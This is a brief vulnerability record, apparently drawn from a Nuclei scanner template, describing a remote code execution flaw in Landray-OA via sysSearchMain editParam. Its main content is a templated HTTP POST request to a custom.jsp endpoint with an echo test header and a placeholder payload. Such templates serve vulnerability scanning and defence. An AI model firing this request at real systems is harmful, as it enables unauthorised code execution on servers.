# Vulnerability: Landray-OA - Remote code Execution
**Classification:** CWE-78,CWE-95,CWE-502
**Source:** Nuclei Template (`landray-oa-sysSearchMain-editParam-rce.yaml`)

## Description
Landray-OA through sysSearchMain editParam is vulnerable to Remote Code Execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Test: echo {{randstr}}

var={{payload}}
```

